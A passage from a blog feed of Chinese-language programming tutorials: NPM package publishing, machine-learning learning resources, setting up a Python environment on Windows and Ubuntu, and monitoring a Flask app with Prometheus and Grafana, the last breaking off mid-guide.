  NPM 會根據 main 得到這個專案的的輸出地方是 index.js，所以我們在 index.js 的最後一行說明我要輸出的函式是什麼，在這邊是 function date2obj()。8. index.js 也可以引用別人的 NPM 套件，甚至專案目錄裡面的程式可以非常複雜，但最後要有一個輸出點，讓 NPM 知道以後別人要用這個套件要從哪邊進入。9. 到目前為止，專案裡面只有兩個檔案，package.json 和 index.js。但這樣已經是合格的套件了喔！這兩個檔案缺一不可，package.json 可以想像成貨品的標籤，index.js 則是貨物本身。10. 接下來就可以分享到 NPM 平台上囉！終端機輸入 npm publish 來上傳你的模組，第一次使用這個指令他會需要建立個人資訊和密碼，照著提示做即可。11. 之後假設你有更新模組，package.json 的版本號要增加，例如 0.0.1 變 0.0.2，再輸入 npm publish 就會更新了！
看到這邊，你已經能自己寫一個模組，並分享到 NPM 和世界的人共享開源！不過一個好的套件，到這邊卻還沒完成！
還缺什麼？其實目前為止已經合格了。不過我們可以讓他更好。以軟體工程師的角度，我會希望再增加幾點：

說明文件（Document）
單元測試（Unit Test）
持續整合（CI）

說明文件如果套件的目的是自己用，那麼沒有說明文件倒是無所謂，自己能記住就好。但是我們都已經發佈到 NPM 上了，代表其實我們希望別人也能使用，你不能期望別人翻開你的原始碼，研究半天才知道怎麼使用它，事實上通常我看到說明文件艱澀難懂、甚至沒有的時候，就直接找下一個可行的套件了。所以說明文件可以說是至關重要。
最簡單的說明文件就是在專案根目錄底下建立一個 README.md 檔案。README.md檔案被 NPM 和 Github 預設當作專案首頁，意思是別人點進去看到的第一眼，就是README.md的內容。通常裡面簡單描述這個模組可以幹嘛？該如何使用？比較大型的模組通常會把說明文件用網站呈現，並在 README.md 中引導你去網站查看文件。
不論自己用或給別人用，有說明文件都是比較方便的。
單元測試為什麼要寫單元測試？Google 一下會有很多答案，但以我來說，大概可以歸納兩點：

確保自己寫的程式沒有問題
別人看了比較心安

寫程式非常容易出錯，最低級的錯誤才有機會在編譯、執行的時候馬上看出來，那種藏得非常深的問題，甚至有時候是超大漏洞，往往在寫的時候看不出來。單元測試有幫自己檢查的好處，可以盡可能列出可能的錯誤，在測試的時候即時發現，關於如何寫測試本篇不多敘述。
另外一點就是，當我想用別人套件的時候，我會看他有沒有寫測試，如果沒有的話，實在很難令人放心他沒問題，所以發佈的套件必寫測試幾乎已經成為不成文規定了！
持續整合通常模組的專案還會再加上持續整合的服務，像是 Travis 或 CircleCI 等等。簡單說明持續整合的概念，是每次程式碼有變動的時候，都要能確保它可以編譯、執行、通過測試，以免下次改程式不小心整個模組爛掉，這種檢查有專門的服務商在做，可以完整支援與 Github 同步，每當有新的 Pull Request 或是有新 commit 到專案的分支，持續整合就會做檢查，告訴你新的程式碼有沒有問題，假設都沒問題，就可以把新的程式碼 merge 進 master 主幹中。
最後最後你寫了一個好的套件，總是希望人能用吧？不然不就白寫了嗎！！
有極小機率，你的套件莫名其妙爆紅，但千萬別指望這樣。比較務實的做法是，做一點行銷手段，到社群分享你的套件，寫部落格介紹你套件的原理，在大型專案中自告奮勇提出使用你的套件等等。
希望大家都能寫出好的 NodeJS 模組！


關於作者
劉安齊
軟體工程師，熱愛寫程式，更喜歡推廣程式讓更多人學會

個人網站
Github
FB粉專–微中子


]]></content>
      <tags>
        <tag>nodejs</tag>
        <tag>npm</tag>
        <tag>module</tag>
        <tag>tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Python 學習機器學習（Machine Learning）</title>
    <url>/2017/04/08/how-to-mastering-machine-learning-with-python/</url>
    <content><![CDATA[
隨著資料科學（Data Science）技術的興起，人工智慧（Artificial Intelligence）、機器學習（Machine Learning） 成為近幾年來電腦科學界十分熱門的研究領域，如今在實體和線上的學習機器學習的資源有很多，本文整理了一些好用學習資源希望幫助初學者能更容易使用 Python 入門機器學習的領域中，從零開始學習機器學習。若是對於資料科學不熟悉的讀者可以先參考適用於初學者的資料科學影片 ，讓自己對於資料科學有初步的認識。
什麼是機器學習（Machine Learning）？機器學習是一種資料科學的技術，協助電腦從現有的資料學習，以便預測未來的行為、結果和趨勢。根據學習的方式又可以分為需要解答的監督式學習（Supervised learning）、非監督式學習（Unsupervised learning）和增強學習（Reinforcement learning）（還有一種混合式的半監督式學習）等子類別。機器學習技術可以應用的範圍十分廣泛，總的來說機器學習可以解決以下幾種問題：

分類問題：這是 A 類 或 B 類嗎？

異常值判斷：這很奇怪嗎？

預測性分析：有多少？

分群問題：這是如何組織的？

增強學習協助決策：我接下來該怎麼辦？


當我們蒐集到相關、精確、連貫、足夠資料就可以挑選合適的演算法進行模型的的建置。
為什麼選擇 Python？在資料科學和機器學習領域最重要的兩大程式語言就是 Python 和 R，Python 簡潔易學、應用範圍廣（不限於數據分析）且學習曲線平緩，適合作為第一個入門的程式語言，透過 pandas、SciPy&#x2F;NumPy、sckikit-learn、matplotlib 和 statsmodels 可以進行數據分析的工作，適合工程任務和需要和網路應用程式整合的專案。至於 R 由於是統計學家開發的程式語言，則是擅長於統計分析、圖表繪製，常用於學術研究領域，建議也要有一定程度的掌握。一般情況下 Python 和 R 並非互斥，而是互補，許多資料工程師、科學家往往是在 Python 和 R 兩個語言中轉換，小量模型驗證、統計分析和圖表繪製使用 R，當要撰寫演算法和資料庫、網路服務互動等情況時在移轉到 Python。為了降低學習成本，我們先使用 Python 進行介紹。
若對於 Python 和 R 比較，這邊有兩篇文章可以參考 数据科学界华山论剑：R与Python巅峰对决、Which is better for data analysis: R or Python?。
如何開始入門機器學習？事實上，資料科學是個跨領域學門，在學習如何使用 Python 進行機器學習過程中通常必須掌握以下知識：

機器學習演算法
Python 程式語言和資料分析函式庫
線性代數&#x2F;統計學等相關學門
專業領域的領域知識（Domain Knowledge）

為了掌握以上三大領域知識（我們先把焦點放在機器學習核心技法，暫時忽略資料科學中對於領域知識的掌握），具體來說我們可以有以下步驟可以參考：

掌握基礎 Python 程式語言知識
 線上學習資源：

Codecademy
DataCamp （也可以學 R）
Learn X in Y Minutes (X &#x3D; Python)
Learn Python the Hard Way


了解基礎數學&#x2F;統計學和機器學習基礎知識

可汗學院線性代數

Intro to Descriptive Statistics

Intro to Inferential Statistics	

Andrew Ng 機器學習課程

Andrew Ng 機器學習筆記

Carnegie Mellon University Machine Learning



知道如何使用 Python 科學計算函式庫和套件
 推薦安裝 Anaconda，支援跨平台多種版本 Python，預設將數據分析、科學計算的套件裝好，自帶 spyder 編輯器、Jupyter Notebook（IPython Notebook），可以提供一個網頁版介面，讓使用者可以透過瀏覽器進行 Julia、Python 或 R 程式的開發與維護。

numpy：科學分析，Scipy Lecture Notes 教學文件
pandas：資料分析
matplotlib：會製圖瞟
scikit-learn：機器學習工具


使用 scikit-learn 學習 Python 機器學習應用

Machine Learning: Python 機器學習：使­用Pytho­n


運用 Python 實作機器學習演算法

感知器
決策樹
線性迴歸
k-means 分群


實作進階機器學習演算法

SVM
KNN
Random Forests
降低維度
驗證模型


了解深度學習（Deep Learning）在 Python 的實作和應用

NTU Applied Deep Learning
Stanford Deep Learning
深度學習(Deep Learning)自學素材推薦
深度學習 Deep Learning：中文學習資源整理



總結以上整理了一些機器學習網路學習資源，若你累積一些小小經驗後，不妨挑戰一下 Kaggle 測試一下自己的實力並累積更多數據分析的經驗。
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
延伸閱讀
7 Steps to Mastering Machine Learning With Python
人人都可成為資料科學大師！一整年的網路自學清單就在這了
Analytics Vidhya
台灣資料科學年會
「2016 台灣資料科學愛好者年會」精彩資料總整理(持續更新中)
大數據會消失，資料科學不會！你該知道的資料科學第一堂課
如何選擇 Microsoft Azure Machine Learning 的演算法
Microsoft Azure Machine Learning 機器學習服務文件
Kdnuggets
Bigdatafinance
Using Python and R together: 3 main approaches
机器学习最佳入门学习资源
机器学习(Machine Learning)&amp;深度学习(Deep Learning)资料(Chapter 1)

（image via respondr）
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>機器學習</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>人工智慧</tag>
        <tag>監督式學習</tag>
        <tag>Supervised learning</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在 Windows 打造 Python 開發環境設定基礎入門教學</title>
    <url>/2018/04/14/how-to-setup-python-development-environment-in-windows/</url>
    <content><![CDATA[前言如何設定開發環境應該是每個初學程式設計者的痛（即便是老手有時也會覺得苦惱），尤其當你需要在終端機（terminal）輸入指令（command）來操控你的指令時（好吧，若你完全只走圖形化介面，習慣 GUI 操作就另當別論，但若你有志於往程式設計領域發展，建議還是熟悉一下指令碼）。
要在 Linux、Mac OS 這種屬於類 Unix 系統（指各種 Unix 的衍生系統，而 Unix 指的是一種電腦作業系統，具有多工、多使用者的特色，是許多作業系統的父親）上打造 Python 開發環境相對容易，但當你使用 Windows 作業系統並希望在終端機下指令操作或開發應用程式時，往往受限於環境而產生許多困難和誤踩地雷。因此，接下來本文將教大家如何在 Windows 打造屬於自己的 Python 開發環境（包含一般 Winodows 安裝和使用虛擬機在 Windows 環境下建立 Linux&#x2F;Ubuntu 作業系統，開發 Python 程式一般建議使用 Linux&#x2F;Ubuntu 環境避免環境設定除錯困擾）！
開始建置 Python 開發環境所謂工欲善其事，必先利其器，在開始之前我們必須先建置相關的開發環境，讓自己從麻瓜（不會寫程式的人）變成擁有程式魔力的魔法師。以下介紹我們在接下來開發 Python Web 應用程式所需要安裝的開發環境工具（強烈建議使用 Virtual Box 虛擬機搭配 Linux&#x2F;Ubuntu 環境，若你真的很想使用 Windows 環境就繼續往下看吧！）。

Microsoft VSCode 編輯器 Microsoft VSCode 是 Microsoft 推出的編輯器（非整合開發環境 IDE），夾帶著 Microsoft 過去打造 Visual studio 整合開發環境的豐富經驗，相比 Sublime Text 和其他編輯器，VSCode 的優勢在於開源且活躍的開發社群、內建 debugger 框架、原生 Git 整合、套件整合容易等特性。綜合以上幾點，對於初學者來說 VSCode 是一個蠻適合入門的開發環境。它的安裝方式也十分簡易，在官網下載後按照指示安裝完成即可，下載完成後可以打開看看。
  
 我們可以點選左邊 icon 欄的第五個（長得像正方形拼圖），安裝 Python 語法和格式檢查的相關套件幫助除錯（搜尋 Python），選擇 Python 並點選 install 安裝：
  
 你也可以於檔案（file）-&gt; 開啟（open）打開你在電腦中已經準備好的專案資料夾，同時也可以在資料夾中新增檔案，我們之後的程式也會希望在建立好的專案資料夾中進行開發。這邊我們建立一個 hello.py 的檔案並印出 hello 訊息。
 hello.pyprint(&#x27;hello python&#x27;)

終端機環境（iTterm&#x2F;內建 terminal） terminal（終端機）是我們下指令的地方，許多時候我們進行程式開發時不會使用 GUI 圖形化介面而是使用下指令方式請電腦做相對應的行為（記得寫程式就是下指令請電腦做事情！）。在 Linux 和 Mac 裡面都有內建的 terminal 的應用程式，以下為 MacOS 的 iTerm2 終端機下指令示意圖（iTerm2 中 $ 為提示字元，不用輸入）：
  
 使用 Windows 讀者可以使用 Cmder 這個軟體當做終端機環境。
  
 比起 Winodws 內建的命令列 CMD，cmder 更貼近 Unix 的命令列指令碼：
  
 首先到 Cmder 官網先安裝 Cmder Full 版本（含 git），安裝完成後解壓縮資料夾到桌面，執行裡面的 cmder.exe 檔案即可。
  
 Cmder 預設是 λ，如果不習慣可以改成 Mac &#x2F; Linux 環境下的 $，具體流程請參考這份文件。
  
 對於有志於從事程式開發相關工作的讀者建議可以多熟悉指令碼的輸入，更多指令碼可以參考鳥哥撰寫的 Linux 基本指令介紹 和 Linux 學習資源。
 以下是常用指令# 移動到桌面cd \Users\XXXX\Desktop# 列出資料夾下檔案ls# 刪除檔案rm 檔名# 複製檔案cp 檔名


Git 版本控制系統&#x2F;註冊 GitHub 帳戶 Git 是一種分散式版本控制系統，可以讓我們可以更方便地管理我們的程式碼。在網路上有非常多優秀的 Git 教學文件（連猴子都能懂的Git入門指南、寫給大家的 Git 教學、初心者 Git 上手攻略）。安裝 Git 方式是到官網下載軟體，依照指示安裝（若您使用 Cmder 的完整安裝 Download Full 的版本就不用安裝 git，因為已經幫你安裝好了）。
  
 互動式語法學習：
  
 在介紹完 git 之後我們來了解一下 GitHub。GitHub 是一個可以存放 git 程式碼專案的平台，透過 GitHub 我們可以接觸到最新的開放原始碼資訊，也可以將我們的程式碼開源出來。
  
 從 GitHub 上複製程式碼
 

 # 複製一份到本地端$ git clone https:#github.com/kdchang/python101.git# 移動到資料夾$ cd python101

 常見 Git 指令：
 # 初始化專案$ git init# 查看狀態$ git status# 檢查差異$ git diff # 將變更檔案放入暫存區$ git add index.py# 使用 commit -m 提交變更$ git -a -m &#x27;init commit&#x27;# 查看歷史$ git log# 放棄已經 commit 的檔案重回暫存區$ git reset HEAD index.py# 放棄檔案變更$ git checkout index.py

Anaconda Python3 版本 Anaconda 是一個 all-in-one 的 Python 開發環境，對於初學者來說是個十分合適的開發環境包。Anaconda 具備了幾項特點：
 - 便於安裝許多流行的科學、數學、工程、資料分析的 Python 模組  
 - 免費並支援跨平台：Linux、Windows、Mac
 - 內建 Spyder 編輯器和 Jupyter Notebook 環境 
 - 方便建立不同的虛擬開發環境

 安裝流程也十分簡單，進入 Anaconda 首頁，選擇對應作業系統（這邊使用 Windows）和是屬於 64 還是 32 位元： 
 Windows10 可以在系統看到位元資訊；  
 Windows7 可以在控制台-&gt;系統與安全-&gt;系統觀看作業系統位元資訊：  
 選擇對應 Python 版本下載（這裡選擇 Python3 以上版本），我們使用 Graphical Installer（圖像介面安裝方式），接著在下載完成時按照預設的安裝方式完成安裝；  
 記得安裝時要注意建議在安裝 anaconda 時勾選把環境變數加入（path environment variable），這樣在使用 cmder 時使用 conda 相關指令才不會出現錯誤，若一開始沒有勾選的話建議解除安裝後再重新安裝 anaconda 勾選加入環境變數。
  
 若是完整安裝成功，可以打開 Cmder 終端機輸入，若是顯示 Python 3.6.0 :: Anaconda 4.3.0 (x86_64) 版本號即安裝成功（若沒成功可能要檢查一下是不是環境變數路徑的問題）：
 $ python -VPython 3.6.0 :: Anaconda 4.3.0 (x86_64)

 接著要建立我們專案虛擬環境，這樣在安裝操作套件時比較不容易被污染到 root 全域的環境（因為你可能會有很多專案，專案使用的套件不盡相同，正式上線時只要把相關套件資訊透過 pip freeze &gt; requirements.txt 存起來，然後在正式上線的伺服器安裝 pip install -r requirements.txt 即可），啟動後會出現（套件名稱）的提示字元：
 顯示目前虛擬環境列表conda info -e 創建虛擬環境conda create -n 套件名稱 python=3.6進入虛擬環境（若是非 Windows cmder 環境加 source 於開頭） ，成功後提示字元變成：（套件名稱）$activate 虛擬環境名稱離開虛擬環境（若是非 Windows cmder 環境加 source 於開頭） deactivate 

建立虛擬環境（virtual environment）接著我們正式來建立一個 Python 的專案，打開終端機移動到桌面，建立專案資料夾（在輸入指令時可以使用 tab 自動補完指令）
# 移動到桌面cd \Users\XXXX\Desktop# 建立資料夾mkdir python_examples# 移動到資料夾cd python_examples

建立獨立虛擬環境，並進入虛擬環境：
# 創立虛擬環境conda create -n python_examples_venv python# 啟動虛擬環境activate python_examples_venv

成功進入虛擬環境後（會出現小括號 python_examples_venv）代表已經進入虛擬環境，即可以在裡面執行 Python 程式並安裝相關套件於該虛擬環境下：
# 安裝 django web 框架套件pip install django# 執行 python 檔案python hello.py

事實上，在 Python3 中還有另外兩種建立虛擬開發環境的方式，包括使用 Python 內建工具：
# 使用 Python3 內建工具建立名為 example_venv 的虛擬開發環境python -m venv example_venv

使用 virtualenv，和 anaconda 不同的是 virtualenv 會在建立虛擬環境的專案資料夾下建立一個資料夾裡面放虛擬環境的東西：
# 先安裝 virtualenvpip install virtualenv# 使用 virtualenv 產生一個名為 example_venv 的virtualenv example_venv# 移動到 example_venv 的外面資料夾，執行進入虛擬環境example_venv\Scripts\activate# 安裝 django web 框架套件到虛擬環境中（只會安裝在該虛擬環境中）pip install django

整合在一起：在 Windows 撰寫你的第一個 Python 程式確認安裝好以下工具後，我們就可以開始撰寫你的第一個 Python 程式

安裝 Microsoft VSCode
安裝 Cmder
安裝 Anaconda（記得勾選加入環境變數）
安裝 virtualenv (在終端機使用：pip install virtualenv 安裝)
在桌面創建一個 python_example 資料夾，打開 Microsoft VSCode 後開啟該專案資料夾，創建一個 hello.py 的檔案並在裡面打上 print(&#39;hello python!!&#39;)
打開 cmder 終端機 cd 移動到 hello.py 所在資料夾
執行 python hello.py，恭喜你完成第一個 Python 程式！

在 Windows 上安裝 Linux&#x2F;Ubuntu
安裝 VirtualBox 對應版本虛擬機（這邊安裝 Windows 版本，若你是 Mac 想嘗試 Linux 也可以安裝 Mac 版本），下載完按照步驟安裝完成
  

到官網下載 Linux&#x2F;Ubuntu 光碟映像檔案，請根據電腦位元架構選擇最新桌面穩定版本 16.04 LTS（for windows）
  

建立 Linux Ubuntu 虛擬機，可以參考這篇 VirtualBox 虛擬機器安裝 Ubuntu 設定教學，設定一下名稱、作業系統類型和版本，欲分配給虛擬的記憶體大小（建議調整為大約實體記憶體的 1&#x2F;3，舉例來說你有 30G 記憶體，可以分配 10G 給虛擬機）。接著選擇立即建立虛擬硬碟、VDI (VirtualBox 磁碟映像)、動態配置硬碟大小不會造成浪費（虛擬硬碟容量建議 30G 以上）。
  

選擇建立好的虛擬機並選設定值按鈕，選擇存放位置選項，控制器中選擇虛擬 CD&#x2F;DVD 檔案選擇剛剛從官網下載下來的檔案，確定後接著選擇虛擬機並啟動，接下來選擇安裝 Linux&#x2F;Ubuntu，選擇立即安裝和預設值，需要一段時間安裝和設定（中間會有語言相關的選擇和密碼設定）
  

啟動使用 Linux&#x2F;Ubuntu，按照上面教學安裝 Microsoft VSCode 編輯器，安裝 Anaconda，建立第一個 Python 檔案、打開終端機（termical）安裝 ，執行 Python 程式
 


網路上也有許多相關參考教學文章：VirtualBox 5.2安裝Ubuntu 16.04 相關教學、VirtualBox 虛擬機器安裝 Ubuntu 設定教學
若是螢幕太小可以在上排選單中選擇：裝置-&gt;插入 Guest Additions CD 映像...-&gt;執行-&gt;重開虛擬機-&gt;可以調整大小。
整合在一起：用 Linux 撰寫你的第一個 Python 程式確認安裝好以下工具後，我們就可以開始撰寫你的第一個 Python 程式

進入虛擬機的 Linux&#x2F;Ubuntu 
安裝 Microsoft VSCode
安裝 Anaconda（記得勾選加入環境變數）
安裝 virtualenv (在終端機使用：pip install virtualenv 安裝)
在桌面創建一個 python_example 資料夾，打開 Microsoft VSCode 後開啟該專案資料夾，創建一個 hello.py 的檔案並在裡面打上 print(&#39;hello python!!&#39;)
打開 terminal 終端機 cd 移動到 hello.py 所在資料夾
執行 python hello.py，恭喜你完成第一個 Python 程式！

總結如何設定開發環境應該是每個初學程式設計者的痛（強烈建議使用 Virtual Box 虛擬機搭配 Linux&#x2F;Ubuntu 環境），以上介紹了如何在 Windows 打造 Python 開發環境設定，請讀者務必照著自己的電腦作業系統環境安裝一次，當然若你有志於往程式設計領域發展，也要熟悉一下指令碼操作。
參考文件
VirtualBox 5.2安裝Ubuntu 16.04
Create virtual environments for python with conda
conda vs. pip vs. virtualenv
Anacodna之conda VS Virtualenv VS Python 3 venv 对比使用教程，创建虚拟环境
命令列指令碼查詢

（image via githubusercontent、websiteoptimization、ytimg、ytimg、ostechnix）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Python</tag>
        <tag>程式設計</tag>
        <tag>coding</tag>
        <tag>自學程式設計</tag>
        <tag>code</tag>
        <tag>Django</tag>
        <tag>MVC</tag>
        <tag>MTV</tag>
        <tag>Web Backend</tag>
        <tag>Web Framework</tag>
        <tag>教學</tag>
        <tag>Flask</tag>
        <tag>框架</tag>
        <tag>CS</tag>
        <tag>Computer</tag>
        <tag>Computer Science</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Prometheus 和 Grafana 打造 Flask Web App 監控預警系統</title>
    <url>/2019/08/26/how-to-use-prometheus-grafana-in-flask-app/</url>
    <content><![CDATA[
前言身為一個開發者，當我們部屬一個 Web service 時，不是射後不理，而是需要透過監控預警系統去 monitor server 的運行狀況，並在緊急狀況即時通知相關人員作對應處理。所以透過好的 monitoring&#x2F;alert system 了解目前 server 硬體系統使用狀況（CPU&#x2F;Memory usage）和整個 service 的網路 networking 狀況是非常重要的一件事情。若是有經驗的讀者，可能過去曾經使用過 Zabbix、Nagios 等工具來監控 service 的運行狀況，以便除錯和維持 service 的可用性（Availability）。
在眾多的 monitor 工具中，Prometheus 是一個很方便且整合完善的監控預警框架 TSDB（Time Series Database）時間序列資料庫，可以很容易建立不同維度的 metrics 和整合不同的 alert tool 以及資訊視覺化圖表的監控工具並提供自帶的 PromQL (Prometheus Query Language) 進行 query 查詢。此外，源自於 SoundCloud 的 Prometheus 目前是獨立於任何公司外的 open source project 並和 Kubernetes 一樣是 Cloud Native Computing Foundation（CNCF） 下的一員（目前已經孵化成熟畢業了），也有許多知名公司如：Uber、DigitalOcean 等導入企業專案，所以在使用上相對有保障。
今天我們就要透過 docker compose 搭配 flask 實作一個簡單 web service 範例，來整合 Prometheus 和 Grafana 來建立一個 web service 監控預警系統。
Prometheus 介紹
簡單來說 Prometheus 是一個監控預警框架和 TSDB（Time Series Database）時間序列資料庫，可以很容易建立不同維度（dimension）的 metrics 和整合不同的 alert tool 以及資訊視覺化的監控工具。透過 Prometheus 我們可以建立一站式的監控預警系統。Prometheus 可能在儲存擴展上比不上其他 Time Series Database，但在整合各種第三方的 data source 上十分方便（算是一個懶人包），且在支援雲端服務和 container 容器相關工具都十分友好。然而在圖表顯現上就稍嫌單薄，所以通常會搭配精美的儀表板工具 Grafana 等來進行資訊視覺化和圖表呈現。

俗話說，一張圖勝過千言萬語：接下來我們用架構圖就可以更清楚了解 Prometheus 整體的架構和定位：

有個 Prometheus server 本體，會去 Prometheus client pull 相關 metrics，若是短期的 job 例如 cronjob 在還來不及 pull 資料回來可能就已經完成任務，清洗掉資料。所以會有一個 pushgateway 接收 job push 過來的相關資訊，Prometheus server 再從其中拉取資料（就是 gateway 的感覺）
上面部分則透過 Service discovery 的方式可以很好的蒐集 kubernetes 相關的資訊
Prometheus 本體會將資料儲存在 local on-disk time series database 或是可以串接 remote storage systems
Prometheus server 資料拉回來後可以提供本身自帶的 Web UI 或 Grafana 和其他 client 來呈現（透過使用 PromQL 進行查詢）
當抓取資料的值超過 alert rule 所設定的閥值（threshold） 時， alert manager 就會將訊息送出（可以透過 Email、Slack、pagerduty 等訊息通知），提醒相關人員注意

另外 Prometheus 更多強化模組礙於篇幅下次再討論：

Node exporter：蒐集作業系統（OS）和硬體（hardware）相關資料
cAdvisor：蒐集容器（container）相關資料

最後，我們要了解的是 Prometheus Client 函式庫支援了四種主要 Metric 的類型：

Counter: 累加的資料，重設值為 0。常用於 HTTP request 錯誤的出現次數或是 error exception 出現次數
Gauge: 屬於與時間無關的當下資料（可以增減），例如：CPU&#x2F;Memory 使用量
Histogram: 主要使用在表示一段時間範圍內的資料蒐集，以長條圖呈現
Summary： 表示一段時間內的資料蒐集的總結

以上就是 Promethus 架構的一個概覽，相信讀者們對於 Promethus 已經有個初步認識，知道 Promethus 是一個監控預警框架和 TSDB（Time Series Database）時間序列資料庫，接下來我們介紹 Grafana 的部分。
Grafana 介紹
Grafana 是由 Grafana Lab 經營的一個非常精美的儀表板 dashboard 系統，可以整合各種不同的 datasource，例如：Promethus、Elasticsearch、MySQL、PostgreSQL 等。透過不同種 metric 呈現在 dashboard 上。在這裡我們主要聚焦在和 Promethus 和 Grafana 的整合上。
專題時間：透過 docker-compose 運行 Prometheus&#x2F;Grafana 監控 Flask Web App接著我們要透過 docker 和 docker-compose 啟動一個簡單 Python Flask Web Server 並使用 Prometheus 和 Grafana 當作其監控預警系統，最後我們會呈現的是一個 Prometheus 和 Grafana dashbaord 以及我們會使用 locust 直接模擬大量 request 去觸發預警系統送通知到 slack！（若是對於 docker&#x2F;docker compose 或 locust 比較不熟悉的讀者可以參考筆者之前撰寫的相關文章：Docker Compose 建置 Web service 起步走入門教學 和 如何使用 Python 和 Locust 進行 Load testing 入門教學
）。
建立 Flask Web App
透過 docker&#x2F;docker-compose 建立 Web App
 我們這邊使用一個 flask web app 當作測試，也就是一個讓 prometheus_server pull 資料回去的 server。
 首先先安裝相關套件，建立 requirements.txt 檔案：
 flaskprometheus_clientlocustio

 以下是 Dockerfile：
 FROM python:3.6-alpineADD . /codeWORKDIR /codeRUN pip install -r requirements.txtCMD [&quot;python&quot;, &quot;app.py&quot;]

 這邊使用一個簡單的 flask app 來當作測試（app.py），主要是提供一個 endpoint /，並使用 prometheus_client 中 counter metric，當有使用者打 endpoint，則累加紀錄一次。而 /metrics endpoint 則 export 了 flask app server 的資訊，提供 prometheus_server 來 pull 相關資料回去。（這裡為求簡化流程所以只使用 Counter，讀者可以自己嘗試新增 Gauge、Histogram、Summary 等 metric 類型）
 import prometheus_clientfrom prometheus_client import Counterfrom flask import Response, Flask, jsonifyapp = Flask(__name__)total_requests = Counter(&#x27;request_count&#x27;, &#x27;Total webapp request count&#x27;)@app.route(&#x27;/metrics&#x27;)def requests_count():    total_requests.inc()    return Response(prometheus_client.generate_latest(total_requests), mimetype=&#x27;text/plain&#x27;)@app.route(&#x27;/&#x27;)def index():    total_requests.inc()    return jsonify(&#123;        &#x27;status&#x27;: &#x27;ok&#x27;    &#125;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)

 在 docker-compose.yaml 追加 flask app（透過 Dockerfile 啟動，port 在 5000）
 version: &#x27;3.7&#x27;services:    web:        build: .        ports:        - &quot;5000:5000&quot;        volumes:        - .:/code # 把當前資料夾 mount 掛載進去 container，這樣你可以直接在本地端專案資料夾改動檔案，container 裡面的檔案也會更動也不用重新 build image！

 接著在終端機透過 docker-compose up 就可以啟動 flask web app 在 localhost:5000 囉！


設定 Promethus
在資料夾下建立設定檔案：prometheus.yaml
 # 設定 global 全域設定# scrape_interval 是多久抓取一次資料global:    scrape_interval: 5s    external_labels:        monitor: &#x27;demo-monitor&#x27;# scrape_configs 則是抓取來源，這邊先設定我們 prometheus 本體 server 和 flask api_monitor，docker-compose 會把 service 加入 default network 所以可以用 web:5000 找到 flask app web servicescrape_configs:    - job_name: &#x27;prometheus&#x27;    static_configs:        - targets: [&#x27;localhost:9090&#x27;]    - job_name: &#x27;api_monitor&#x27;    scrape_interval: 5s    static_configs:        - targets: [&#x27;web:5000&#x27;]

透過 docker&#x2F;docker-compose 安裝 Prometheus
 version: &#x27;3.7&#x27;volumes:    prometheus_data: &#123;&#125;    grafana_data: &#123;&#125;services:  prometheus:    image: prom/prometheus:v2.1.0    volumes:      - ./prometheus.yaml:/etc/prometheus/prometheus.yaml    command:      - &#x27;--config.file=/etc/prometheus/prometheus.yaml&#x27;    ports:      - &#x27;9090:9090&#x27;

在終端機使用 $ docker-compose up 啟動 Prometheus

觀看 promethus web UI dashboard
 

觀看 promethus metrics
 Prometheus metric 呈現格式：
 &lt;metric name&gt;&#123;&lt;label name&gt;=&lt;label value&gt;, ...&#125;

 

觀看 flask app metrics
 


到這邊恭喜讀者已經完成 Promethus 的初始設定並擁有一個 Promethus Service 了，接下來我們要把資料串接到 Grafana 讓資料可以透過 dashboard 呈現。
設定 Grafana
透過 docker-compose 安裝 Grafana
 grafana:    image: grafana/grafana    volumes:        - grafana_data:/var/lib/grafana    environment:      - GF_SECURITY_ADMIN_PASSWORD=pass    depends_on:      - prometheus    ports:      - &#x27;3000:3000&#x27;

串接 promethus datasource 到 grafana 上（登入帳號為 admin&#x2F;pass）
 
 首先我們先選擇 Add data source，可以看到有很多不同的資料來源可以串接：
 
 
 我們選擇串接 Promethus 為 datasource，並在串接 url 輸入 http://promethus:9090（透過 promethus docker compose 會幫我們找到對應 ip），就可以找到 Promethus 的 metrics 資料。
 
 由於 Promethus 是使用 PromQL 讀取資料，所以一開始不熟悉的話可以先把預設的 dashboard 給 import 進來，在 dashboard 就可以看到預設 dashboard，可以選擇 dashboard 上的 edit 參考相關語法
 
 回到就可以看到 Promethus 2.0 Stats 等圖表可以觀看：
 
 但我們想看的是我們 Flask Web App 的 Counter 次數，所以我們可以點選左方選單的 + 號，手動新增圖表 dashbaord（選擇 Add Query），透過 Query 下拉式選單選擇 Promethus 然後 Metrics 下拉選 request -&gt; request_count_toal 就可以看到 flask web app 被 request 次數。此時可以手動重新整理多次 flask web app 頁面就可以看到統計資料持續往上。接下來我們會使用 locust 直接模擬大量 request 去觸發預警系統送通知到 slack！
 
 
 更多圖表，讀者若有興趣可以繼續探索：
 
 


設定 Alert manager
透過 docker-compose 安裝 Alert manager 在 docker-compose 追加 alertmanager 相關設定，也記得也要把這段 - ./alert_rules.yaml:/etc/prometheus/alert_rules.yaml 放到 prometheus service 的 volumes 中
 alertmanager:  image: prom/alertmanager  ports:    - 9093:9093  volumes:    - ./alertmanager.yaml/:/etc/alertmanager/alertmanager.yaml  restart: always  command:    - &#x27;--config.file=/etc/alertmanager/alertmanager.yaml&#x27;    - &#x27;--storage.path=/alertmanager&#x27;

 設定 slack 取得 YOUR_SLACK_WEBHOOK_URL
 
 

新增 alert_rules.yaml 檔案於資料夾下，定義規則（request_count_total &gt; 100 持續超過 10s 就準備發出 alert 送到 slack）：
